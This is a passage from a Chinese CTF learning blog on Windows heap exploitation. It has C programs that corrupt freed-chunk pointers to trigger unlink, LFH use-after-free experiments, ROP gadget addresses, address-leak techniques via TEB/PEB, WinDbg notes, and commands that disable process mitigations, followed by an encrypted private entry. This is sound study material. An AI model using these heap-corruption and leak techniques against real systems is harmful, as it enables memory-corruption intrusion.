HeapFree(hHeap, 0, ptr[0]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); printf("success!!!\n"); return 0;&#125; 失败案例3： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[5];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[3]); // &lt; == change point HeapFree(hHeap, 0, ptr[1]); // &lt; == change point printf("%p: %p\n", &amp;ptr[1], ptr[1]); *(void**)(ptr[1]) = &amp;ptr[1] - 1; *(void**)(ptr[1] + 8) = &amp;ptr[1]; HeapFree(hHeap, 0, ptr[0]); printf("%p: %p\n", &amp;ptr[1], ptr[1]); printf("success!!!\n"); return 0;&#125; 结论： 被unlink的chunk不能被对应size的LFH指向。因为LFH会检测next_chunk的size是否和当前chunk的size一样，所以会有decode(ptr-&gt;Flink-&gt;header)，并且检查checksum的过程，因为这时候的Flink已经被我们破坏，所以会检测失败，从而崩溃。所以我们想要成功unlink的方式主要有两种： 在free目标chunk后，再free一个相同size的chunk来替换掉对应size的LFH。 在free目标chunk后，在其Flink指向的位置-8处伪造一个header。 x86经测试与x64情况相同。 在HeapAlloc中触发unlink:x64成功案例1： 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[8];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[6] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[1]); HeapFree(hHeap, 0, ptr[3]); HeapFree(hHeap, 0, ptr[5]); printf("%p\n", ptr[5]); *(long*)(ptr[1]) = 0xdeadbeef; *(long*)(ptr[1] + 8) = 0xdeadbeef; ptr[7] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); printf("%p\n", ptr[7]); system("pause"); return 0;&#125; 失败案例1： 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[8];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); //ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); //ptr[6] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[1]); HeapFree(hHeap, 0, ptr[3]); printf("%p\n",ptr[3]); *(long*)(ptr[1]) = 0xdeadbeef; *(long*)(ptr[1] + 8) = 0xdeadbeef; ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); printf("%p\n",ptr[5]); system("pause"); return 0;&#125; 失败原因：因为在对应size的LFH中有chunk，也就是ptr[3]，所以会将ptr[3]解链，解链时的检测：Q-&gt;Flink-Blink == Q没过，因为此时的Q-&gt;Flink也就是ptr[1]的Blink已经被我们篡改为非法。对比可知成功案例1的成功原因。 成功案例2： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt; #include &lt;windows.h&gt;HANDLE hHeap = NULL;char* ptr[8];int main() &#123; hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000); //system("pause"); ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); ptr[6] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20); HeapFree(hHeap, 0, ptr[3]); unsigned long long header1 = *(unsigned long long*)(ptr[1] - 8); printf("header1 = %p\n",header1); unsigned long long cookie = header1 ^ 0x0800000302010003; printf("cookie = %p\n",cookie); unsigned long long header2 = *(unsigned long long*)(ptr[3] - 8); unsigned long long real_header2 = cookie ^ header2; printf("real_header2 = %p\n",real_header2); *(void**)(ptr[3]) = &amp;ptr[3] - 1; *(void**)(ptr[3] + 8) = &amp;ptr[3]; ptr[1] = (char*)(cookie ^ 0x0800000405010004); ptr[7] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28); printf("%p: %p\n",&amp;ptr[3],ptr[3]); system("pause"); return 0;&#125; 结论：想要在HeapAlloc中触发unlink成功，需要两个条件： Flink指向的位置-8处需要伪造一个header。 因为申请后返回的chunk肯定是对应size的LFH指向的chunk，所以我们修改的Flink&amp;Blink也必须是那个chunk，若不是的话，就可能发生失败案例1的情况。 x86与x64情况类似。 FrontEnd-UAF关于LFH的实验：需要注意的点在调试态下不会开启，只能attach上去调试。 需要用HeapCreate(HEAP_GROWABLE, 0, 0)创建新堆，用HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000)不会开启LFH。 申请19个chunk之后，第20个chunk是第一个在UserBlock分配的chunk。 需关注_HEAP+0x198(FrontEndHeap)和_HEAP+0x1a8(FrontEndHeapUsageData)处的数据。FrontEndHeap在第19次申请之后会初始化为_LFH_HEAP，FrontEndHeapUsageData指向一块chunk，里面记录着每个size的chunk被分配的次数，每被分配一次就增长0x21。到达一个阈值就会归零并开启对应size的LFH。 每个UserBlock大概会有25个chunk。。。我测试时是25个，可能具体需要看情况。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt; #include &lt;windows.h&gt;#include &lt;io.h&gt;HANDLE hHeap = NULL;char* ptr[0x20];int main() &#123; //char name[0x20]; //setvbuf(stdout, NULL, _IONBF, 0); //setvbuf(stdin, NULL, _IONBF, 0); hHeap = HeapCreate(HEAP_GROWABLE, 0, 0); // &lt; == important！！！ //puts("who are you:"); //_read(0, name, 0x20); system("pause"); for (int i = 0; i &lt; 19; i++) &#123; ptr[0] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); &#125; ptr[1] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[1],'\x11',0x40); ptr[2] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[2], '\x22', 0x40); ptr[3] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[3], '\x33', 0x40); ptr[4] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[4], '\x44', 0x40); ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[5], '\x55', 0x40); ptr[6] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[6], '\x66', 0x40); ptr[7] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[7], '\x77', 0x40); ptr[8] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[8], '\x88', 0x40); ptr[9] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[9], '\x99', 0x40); ptr[10] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[10], '\xaa', 0x40); ptr[11] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[11], '\xbb', 0x40); ptr[12] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[12], '\xcc', 0x40); ptr[13] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[13], '\xdd', 0x40); ptr[14] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[14], '\xee', 0x40); ptr[15] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[15], '\xff', 0x40); ptr[16] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[16], '\xf0', 0x40); ptr[17] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[17], '\xf1', 0x40); ptr[18] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[18], '\xf2', 0x40); ptr[19] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x40); memset(ptr[19], '\xf3', 0x40); system("pause"); return 0;&#125; 出题笔记关闭代码优化，VC++编译器： 12#pragma optimize( "", off )#pragma optimize( "", on ) VS新建项目时选空项目。 x64下一个通用的gadget，本机的ntdll库里的位置在：0x8FB20，内容为pop_rdx_rcx_r8_r9_r10_r11_ret rop/ucrtbase流派：ucrtbase!_open，ucrtbase!_read，ucrtbase!puts/_write shellcode/KERNEL32流派：KERNEL32!VirtualProtectStub，KERNEL32!ReadFile，KERNEL32!CreateFileA，KERNEL32!GetStdHandleStub，KERNEL32!WriteFile 两者都需要注意栈下溢，一般一个函数调用完会覆盖其返回地址后两到三个数据，需要pop掉。 关于调试dt _HEAP heapbase -r2 dt _HEAP_ENTRY chunk_address 关于泄露windows中dll和各种结构体众多，且其相互之间关系比较复杂，所以泄露的过程也比较繁琐多变，最重要的就是ntdll和stack的泄露了。 泄露ntdll的地址可以用堆上的_HEAP_LOCK(一般在heapbase+0x2C0)： _HEAP-&gt;LockVariable.Lock CriticalSection-&gt;DebugInfo 指向ntdll的指针，比如PE或者其他dll的IAT表。 泄露栈地址一般有两种方法： KERNELBASE!BasepFilterInfo附近，泄露KERNELBASE一般用KERNEL32。 TEB+8处为StackBase(其后两字节一般为\x00)，TEB+0x10处为StackLimit(栈的结束地址，其一般最后一字节为\x00，值为StackBase-0x3000，也有可能为StackBase-0x4000)，泄露Teb需要ntdll!PebLdr的地址。 关于_PEB_LDR_DATA： fs:[0x30] =&gt; Teb =&gt; Peb =&gt;_PEB_LDR_DATA(和ntdll!PebLdr值一样)=&gt;_LDR_DATA_TABLE_ENTRY 123InLoadOrderModuleList; //模块加载顺序InMemoryOrderModuleList; //模块在内存中的顺序InInitializationOrderModuleList; //模块初始化装载顺序 这三条双向链表又指向_LDR_DATA_TABLE_ENTRY中的DllBase字段。 这样可以获得所有dll的基址。 https://www.anquanke.com/post/id/173586 https://blog.csdn.net/qq_35426012/article/details/102711275 笔记windbg使用笔记断下main函数：bp @$exentry 看进程地址分布(相当于vmmap)：lm 列出当前进程中加载的所有dll文件和对应的路径：lmf 可以查看任意一个dll的详细信息：lmvm 查看地址页权限属性等：!address 在内存中搜索字符串：s -a start_address Lrange &quot;your_string&quot;，例如在从0x7f0000000000开始往后的0x1000000范围内搜索xxrwtcl，则为s -a 0x7f0000000000 L1000000 &quot;xxrwtcl&quot;。搜word =&gt; -w，qword =&gt; -q，dword =&gt; -d，unicode =&gt; -u。 查看断点：bl 查看当前线程堆栈： kn/kb/kp/kP 汇编窗口：ALT+7 堆栈窗口：ALT+6 等效于 kn 内存窗口：ALT+5 寄存器窗口：ALT+4 看程序头部信息：!dh -a filename 运行程序：F5/g 单步步入：F11/F8/t 单步步过：F10/p 跳出当前函数：shirt+F11 重新开始：Ctrl+Shift+F5 查看teb/peb地址：r $teb/r $peb 查看teb/peb信息：!teb/!peb 查看固定地址的数据：db(byte)/w(word)/d(dword)/a(ascii)/u(unicode)/c(char) address(16进制) 也可直接跟寄存器：d esp 下断点：bp address 查看断点信息：bl 删除断点：bc 寄存器前加@可以当地址使用：da @rcx，查看rcx寄存器地址处的字符串 修改内存：e，用法与d类似，eb/ew/ed/eq/ep/ea/eu address value 命令显示或修改寄存器、浮点寄存器、标志位、伪寄存器和预定义别名：r 直接用r，会显示当前线程的寄存器状态 ~0 r表示显示0号线程的寄存器状态 ~* r会显示所有线程的寄存器状态 ~0 r eax = 0x1可以对1线程进行eax赋值 ~* r eax = 0x1，可以对所有线程进行eax赋值 加载符号文件：reload !sym 把指定地址上的代码翻译成汇编输出：u address 查看符号的二进制地址：x -&gt; x ucrtbase!system ，支持通配符：x ucrtbase!*列出ucrtbase模块所有符号和对应的二进制地址。 dds address/reg打印内存地址/寄存器指向地址上的二进制值，同时自动搜索二进制值对应的符号。x86为dds，x64为dqs，dps自动根据当前处理器架构来选择最合适的长度。 dt命令显示局部变量、全局变量或数据类型的信息。它也可以仅显示数据类型。即结构和联合(union)的信息。 dt _peb dt ntdll!_peb dt _heap dt _heap_entry dt _teb ~ 命令是用来切换目标线程 ~ 可以显示线程的信息~0s 把当前的线程切换到0号线程，也就是主线程，切换后提示符会变为0:000，查看teb时一定要切换到主线程 ~* 命令列出当前进程中的所有线程的详细信息 ~*kb 命令列出所有线程的堆栈 找IAT表项：例如，找KERNEL32中从ntdll.dll导出的符号：x KERNEL32!_imp__nt* 在做堆题时一些有用的命令： !heap !heap -a [heap address] dt _HEAP [heap address] dt _HEAP_LIST_LOOKUP [address] dt _LFH_HEAP More Windbg usage https://github.com/hugsy/defcon_27_windbg_workshop 我的配置： Font：Lucida Sans Typewriter size：五号 Background：black Text：white Normal level command window text：white Normal level command window text background：black Prompt level command window text：red Prompt level command window text background：black 关于交互python脚本 1234567891011121314151617181920212223242526272829303132333435363738import subprocessimport timeimport osimport ast def InputCmd(stdin, cmd): stdin.write(cmd) stdin.flush() def OutputCmd(stdout): // 如果没有输出, 调整睡眠时间 time.sleep(0.1) print(stdout.read().decode("gbk", 'ignore')) def main(): fileOut = open("fout.txt", "wb") readFileOut = open("fout.txt", "rb") prog = subprocess.Popen("babystack.exe", stdin = subprocess.PIPE, stdout = fileOut) while True: OutputCmd(readFileOut) cmd = input("&gt;&gt; ") if "EXIT" == cmd: break if 'b' == cmd[0] and ('"' == cmd[1] or "'" == cmd[1]): cmd = ast.literal_eval(cmd) + b'\n' else: cmd = cmd.encode("utf-8") + b'\n' InputCmd(prog.stdin, cmd) prog.terminate() readFileOut.close() fileOut.close() os.remove("fout.txt") if "__main__" == __name__: main() 很多题目自带一个AppJailLauncher，相当于一个Windows底下的stdio服务器和沙盒，在Win 7下面也是不能直接运行这个程序的，仅支持above Windows8且为x64。 程序源码：https://github.com/trailofbits/AppJailLauncher Ex师傅也写了一个类似的程序，不过没有加沙盒。 程序源码：https://github.com/Ex-Origin/win_server 最方便的方法其实和Linux下面Pwn题目开端口一样，只需要下载nmap，用里面的ncat来打开端口转发stdio即可，具体命令如下：ncat -vc &quot;winpwn.exe&quot; -kl 192.168.21.1 4444。 通过TCP连接上端口之后ncat就会自动打开一个进程，要调试的时候只需要用windbg attach上对应进程即可。 或者直接在wsl下socat tcp-l:1337,fork,reuseaddr exec:./winpwn.exe，我竟然才知道wsl可以运行exe程序，🤮。 powershell Set-ProcessMitigation -Name winpwn.exe -Disable DisallowChildProcessCreati on powershell Set-ProcessMitigation -Name winpwn.exe -Enable DisallowChildProcessCreati on powershell Get-ProcessMitigation -Name winpwn.exe 资料https://www.one-tab.com/page/eaArgKkOSsCm-0oGNbAu1w https://xuanxuanblingbling.github.io/ctf/pwn/2020/07/09/winpwn/ https://kirin-say.top/2020/01/01/Heap-in-Windows/ https://github.com/A7um/slides/blob/master/2017/WinPWN.pdf https://ble55ing.github.io/2019/08/18/WindowsPwn0/#linux%E7%9A%84exp%E7%94%9F%E6%88%90%E6%96%B9%E5%BC%8F%E5%9C%A8windwos%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8 https://ble55ing.github.io/2019/08/18/WindowsPwnHeap/#dword-shoot https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version http://showlinkroom.me/2020/07/14/WindowsHeap101/ https://github.com/saaramar/Publications/blob/master/35C3_Windows_Mitigations/Modern%20Windows%20Userspace%20Exploitation.pdf ntdll!RtlCaptureContext获取stack地址的方法：调用ntdll!RtlCaptureContext，其rcx指向一个结构体(ContextRecord structure)，并且将几乎所有的寄存器都写入这个结构体中，其中包含rsp，我们再将其读出即可： 1234567891011121314151617181920212223242526272829303132333435363738394041424344.text:00000001800A0100 ; void __stdcall RtlCaptureContext(PCONTEXT ContextRecord).text:00000001800A0100 public RtlCaptureContext.text:00000001800A0100 RtlCaptureContext proc near ; CODE XREF: _invalid_parameter+20↑p.text:00000001800A0100 ; __report_gsfailure+13↑p ....text:00000001800A0100.text:00000001800A0100 var_8 = dword ptr -8.text:00000001800A0100 arg_0 = byte ptr 8.text:00000001800A0100.text:00000001800A0100 pushfq.text:00000001800A0102 mov [rcx+78h], rax.text:00000001800A0106 mov [rcx+80h], rcx.text:00000001800A010D mov [rcx+88h], rdx.text:00000001800A0114 mov [rcx+0B8h], r8.text:00000001800A011B mov [rcx+0C0h], r9.text:00000001800A0122 mov [rcx+0C8h], r10.text:00000001800A0129 mov [rcx+0D0h], r11.text:00000001800A0130 fxsave dword ptr [rcx+100h].text:00000001800A0137.text:00000001800A0137 CcSaveNVContext: ; DATA XREF: RtlpCaptureContext+67↑o.text:00000001800A0137 mov word ptr [rcx+38h], cs.text:00000001800A013A mov word ptr [rcx+3Ah], ds.text:00000001800A013D mov word ptr [rcx+3Ch], es.text:00000001800A0140 mov word ptr [rcx+42h], ss.text:00000001800A0143 mov word ptr [rcx+3Eh], fs.text:00000001800A0146 mov word ptr [rcx+40h], gs.text:00000001800A0149 mov [rcx+90h], rbx.text:00000001800A0150 mov [rcx+0A0h], rbp.text:00000001800A0157 mov [rcx+0A8h], rsi.text:00000001800A015E mov [rcx+0B0h], rdi.text:00000001800A0165 mov [rcx+0D8h], r12.text:00000001800A016C mov [rcx+0E0h], r13.text:00000001800A0173 mov [rcx+0E8h], r14.text:00000001800A017A mov [rcx+0F0h], r15.text:00000001800A0181 stmxcsr dword ptr [rcx+34h].text:00000001800A0185 lea rax, [rsp+8+arg_0] //here.text:00000001800A018A mov [rcx+98h], rax //here.text:00000001800A0191 mov rax, [rsp+8].text:00000001800A0196 mov [rcx+0F8h], rax.text:00000001800A019D mov eax, [rsp+8+var_8].text:00000001800A01A0 mov [rcx+44h], eax.text:00000001800A01A3 mov dword ptr [rcx+30h], 10000Fh.text:00000001800A01AA add rsp, 8.text:00000001800A01AE retn.text:00000001800A01AE RtlCaptureContext endp 杂谈system =&gt; common_system&lt;char&gt; =&gt; common_spawnv&lt;char&gt; =&gt; execute_command&lt;char&gt; =&gt; _acrt_CreateProcessA =&gt; kernel32!CreateProcessWStub =&gt; kernelbase!CreateProcessW =&gt; kernelbase!CreateProcessInternalW =&gt; ntdll!NtCreateUserProcess=&gt; syscall https://www.cnblogs.com/arxive/p/11748114.html http://blog.leanote.com/post/snowming/6e3293284019 Windows_x64_系统调用号表 123456789101112131415.text:000000018009D920 NtCreateUserProcess proc near ; CODE XREF: RtlpCreateUserProcess+272↑p.text:000000018009D920 ; DATA XREF: .rdata:0000000180118F20↓o ....text:000000018009D920 mov r10, rcx ; NtCreateUserProcess.text:000000018009D923 mov eax, 0C4h.text:000000018009D928 test byte ptr ds:7FFE0308h, 1.text:000000018009D930 jnz short loc_18009D935.text:000000018009D932 syscall ; Low latency system call.text:000000018009D934 retn.text:000000018009D935 ; ---------------------------------------------------------------------------.text:000000018009D935.text:000000018009D935 loc_18009D935: ; CODE XREF: NtCreateUserProcess+10↑j.text:000000018009D935 int 2Eh ; DOS 2+ internal - EXECUTE COMMAND.text:000000018009D935 ; DS:SI -&gt; counted CR-terminated command string.text:000000018009D937 retn.text:000000018009D937 NtCreateUserProcess endp check.py ucrtbase的发展历史 dll的search流程 http://www.windbg.org/ ntdll!LdrpHandleInvalidUserCallTarget函数中含有可以通用的gadget： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859.text:000000018008C400 LdrpHandleInvalidUserCallTarget proc near.text:000000018008C400 ; CODE XREF: LdrpValidateUserCallTarget+41↓j.text:000000018008C400 ; LdrpValidateUserCallTargetES+41↓j ....text:000000018008C400.text:000000018008C400 var_98 = xmmword ptr -98h.text:000000018008C400 var_88 = xmmword ptr -88h.text:000000018008C400 var_78 = xmmword ptr -78h.text:000000018008C400 var_68 = xmmword ptr -68h.text:000000018008C400 var_58 = xmmword ptr -58h.text:000000018008C400 var_48 = xmmword ptr -48h.text:000000018008C400 var_10 = qword ptr -10h.text:000000018008C400.text:000000018008C400 push r11.text:000000018008C402 push r10.text:000000018008C404 push r9.text:000000018008C406 push r8.text:000000018008C408 push rcx.text:000000018008C409 push rdx.text:000000018008C40A push rax.text:000000018008C40B sub rsp, 80h.text:000000018008C412 movaps [rsp+0B8h+var_98], xmm0.text:000000018008C417 movaps [rsp+0B8h+var_88], xmm1.text:000000018008C41C movaps [rsp+0B8h+var_78], xmm2.text:000000018008C421 movaps [rsp+0B8h+var_68], xmm3.text:000000018008C426 movaps [rsp+0B8h+var_58], xmm4.text:000000018008C42B movaps [rsp+0B8h+var_48], xmm5.text:000000018008C430 mov rcx, rax.text:000000018008C433 call RtlpHandleInvalidUserCallTarget.text:000000018008C438 movaps xmm3, [rsp+0B8h+var_68].text:000000018008C43D movaps xmm2, [rsp+0B8h+var_78].text:000000018008C442 movaps xmm1, [rsp+0B8h+var_88].text:000000018008C447 movaps xmm0, [rsp+0B8h+var_98].text:000000018008C44C mov r10, [rsp+0B8h+var_10].text:000000018008C454 test r10, r10.text:000000018008C457 jz short loc_18008C46E.text:000000018008C459 add rsp, 80h.text:000000018008C460 pop rax.text:000000018008C461 pop rdx.text:000000018008C462 pop rcx.text:000000018008C463 pop r8.text:000000018008C465 pop r9.text:000000018008C467 pop r10.text:000000018008C469 pop r11.text:000000018008C46B jmp rax.text:000000018008C46E ; ---------------------------------------------------------------------------.text:000000018008C46E.text:000000018008C46E loc_18008C46E: ; CODE XREF: LdrpHandleInvalidUserCallTarget+57↑j.text:000000018008C46E movaps xmm5, [rsp+0B8h+var_48].text:000000018008C473 movaps xmm4, [rsp+0B8h+var_58].text:000000018008C478 add rsp, 80h.text:000000018008C47F pop rax .text:000000018008C480 pop rdx // &lt;== here!!!.text:000000018008C481 pop rcx.text:000000018008C482 pop r8.text:000000018008C484 pop r9.text:000000018008C486 pop r10.text:000000018008C488 pop r11.text:000000018008C48A retn.text:000000018008C48A LdrpHandleInvalidUserCallTarget endp]]></content>
      <categories>
        <category>Windows_Userspace_Pwn学习</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>Windows_Userspace_Pwn学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂物3]]></title>
    <url>%2F2020%2F05%2F05%2F%E6%9D%82%E7%89%A93%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 9f2fad5b234f53ed40fb55d496f8b13b6341c4d060282096e8c60ce986f078269609c32225747fdacc8dbde0e220e86d9501fbce3c15b486f5a9f634960d615b9713f7507b46d786a37636783b6caabb6b5bcf9b9f4f1ba535dba001c220e2602318001c10aa1e23e2ec0fa5291ec003eb472cd6cef52baec947a300046fde4e4857fffab4db435980bcf907370b982729f1196404f427319a7906a01f51a9f4650e9fc7df41de940648971326ba72d2d705c0aa18cdddd8acef83feb58f1492955be16c2eab23450f31f423df40d0771bfe0c6b93558bc0b4be723252d65573ab59384645b17b447eb230eae532c13d1053089e159534dcf00cd07ac8fad7aeffef7103185db44adfc54c291152c7c962a8c9d5ab5236a0b4ebda00bb7e6729e5372d3e2359844140bf3d56b2381ebbec836845bac4051a6c2f36ae526a89278d8da89994e47aaae84036b4858aa7f5358c335b8e0eb7f3b0eccf3700a3a0e7d3ced633c547c3d9254e309c5c0797c2fc49db9305826bb577e25eb6e16d5582050b5c925cc7f4a596deb2df5907f21705fe988526af8092d545fc70811978c7842ca174142f6f592554d329a7bd4755fcd1eec670d8c991e25db2cb438f7f99927ca3d754c0f256f6ea9124479b1c396c4d5b1c0b139089e09d3bb5f7c03ce1dff67c25c1e48a946667261cb352a61b27c6029373c5eee96863f24670b34d7bde1187ae62edfccbd301f5b83883bcf6ba4aa5e827059833fbdbc195ac8d6b174f297d97e472b81a8333a1072ecf242e8098574185b66eed175a64925ee82f4584bfb52dd558d8a8209c8c424d52acac9b84c92fbb69269384dfd742c9c342bf3035068cf861ffd7f715f423fcab18adbcebbf2538e95170de1eb5a177e6b1f9653b01167d65214bb2d37c6901f585c1d07e9cdbbe53ec611ad7119a4bf858fd514d1e5586ce8213cce3b7175b9e2fef9101d9b447a22ea037728a04dbcee9a7a5452770182e586f8e9e849d578fababcc94e94884dd8ae303a390d6ce4e24aa6f4060323a258eed2edeec028d9254e7e230dcfe99e1c8aaead0ed3a8bf2df9818507c2cbe3451a77f44b77a65d80ca2957e22c1def1faa5b14a31f3ff6e4b3ad304769587b5c848dd8173ccc3160b05060c58a0456fd0a30cfa6b52769e2c0d7b29069edc5bdafffc67a5545fa32798b6aa40387c4254cbe5100412d01aa4797164bc41fc25af2220bee6f9fb701ad2a9f97ecffa9f83c564b84990aa314f914d354dddc7757f9ebc2729e937d3c97fd6206040919adc9fab4b4a06dc48a39bf97d7305918f3bf92ece77e41ed2784efba3f7b3a3cda54e7f07c17c006c5b67c577b79b9715be4c43e614d7fd2a7a5c25ae0c7bd6bd990bae3c2551e14fa6d51992c1ff3b58625f0088eb79341e967933fe665b9001a07742fc6740fc85c6415d6d257621c97d94baa9135df344162c3d9e0cbaa54417860b661f418814b923cf79930029388580ccce9b7f6d1bee1128926a87b0ab43f4fde314b5d227dd0a62586246c15d32ec5404d335575259c3e3ac661e0b034110843ece4d4655a924610ccdb6aa0e1f39f7c8a206e0650a01a2489816281fc325891c9c75817148b4ba251b884456b26f4458b53b330586d9c7ea7c5ca2c0398913f6c00e117b405fde02810ef40418ee549149ddf63a929ca876a29a2963ecda004f0ef19488cdb80901b8cdc88e1013d9876f85693b8090861c46231bd3c5b963c21de260a492e3fc8b5eb0129577e53824f76fde123200506c9e76721c860c1cbf8d4ac8842b5890a937a12036df56e7beb9b373011046cc271f5e9aedf11a7fabc8af7b381c0d0d0e4b868de93d04c5e8cb7d725005da3b787b7e38614ab18820251030ca28cfaf6a01fea66d8f60b2eddd6f195400858a45895b03d1da785552bdc7e292c7a674c616e62e5b7bdd4205604db578584a7acd0a27df1df6b223e57ca12a080dfc61d08fc6322dee6975d26009317f857aa23f0409c8411dc73ce330efea722a94d85dfb0d60b945c6e3926b9678d8ef8de7a80fb22e7aee5aecdb7df5428abd5fe48f34e10f69dd1053ee8a862c2c61b47d4719c8256edce27585214a08a86793e46d54a7519a5215ab97a5af24c44fdd44daca5b3a83671f601c1326fbf2dcd312185bf297c605113669e9b3565dce122b3bb7b8ce94c6a028a409c75188d8e0295de697733cd2231bb7606285a2dfd8847c77c69cee34b0140d3623d0b14a11fe0b5cad1c1380a2dab81db9ce9bebe7642778665a36f8c1d5c3e5a25d7d38fa82550f1c5373119acd3b81366cbc275d02daea615e16c353bcce90adab54a79ec5ab136f23381e8cd4decfe233dcd5ba6f038ddf46535f2c79ad085530b5ed01e6623c56557cffb1872026be569407106528d00eba2cda21d4cb9fd1145a8d3792d14b28b67806f8403eecef180896148d7a40fdea52a5ecf933a247875bb0c00335c7fff1f5e290cc64ba6e4c56f22c788c951412272d83b9cc8171c7f35ec34b6da8f99c8879a1f5522b86ef7d4b9f105199ff3ef837e056230398c0be9f85df9fd483365f0246bc9ef8e2ee86252400940fc98b02fd613d9459b679ed8b70b7ee096a2516b3183e4a1380e9c03ba5bdc992a2a1043c5442aabed127cdf37d8b9a643a20b7d495bd997c848bcfaa8cd3eab0fc50ab4f3cd46a82aaf77910dc5f2853f3009fe37f8ea6ca20af3974386987b00fe72d568986eba1fe75cfb669c01119212322b9ec0ebb13fca6df38dae150b1cdf62fddc7e0134ac0f91dca546a4c416f84bc19d1c354d31bb02d124f6c03cfef381549342485ddb82b6df5d1c5a9a619fc042e84b31cedb233f14d6cd81b37a7272e518ea25241ec7aad46a285b92241b56a37fcf240e756d78dfb64a026943881c0b4673ec3a7756482fbf9ffaf337401a11039cb1e7b2698ede7858bb9fa79e72190957e0ae71a9df408f35a6994c762dc6ce847a5b76377d881e61704f3a3b1d0e388fd9772b5420ba38cbdc358f20454854cf63bd5627da00cf2d40d0ea7f1490646767